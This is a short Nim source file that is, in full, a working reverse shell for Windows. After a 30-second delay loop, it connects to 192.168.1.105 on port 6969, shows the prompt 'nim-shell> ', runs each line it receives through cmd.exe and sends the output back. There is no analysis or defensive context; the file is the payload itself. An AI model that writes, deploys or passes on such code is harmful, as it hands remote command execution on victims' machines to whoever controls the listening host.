import net, osproc, strformat, times

let now1 = now() + 30.seconds
var i = 1

while now() <= now1:
  var i = i + 1

let
  ip = "192.168.1.105"
  port = 6969
  sock = newSocket()

sock.connect(ip, Port(port))

let prompt = "nim-shell> "
while true:
  send(sock, prompt)
  let bad = recvLine(sock)
  let cmd = execProcess(fmt"cmd.exe /C " & bad)
  send(sock, cmd)
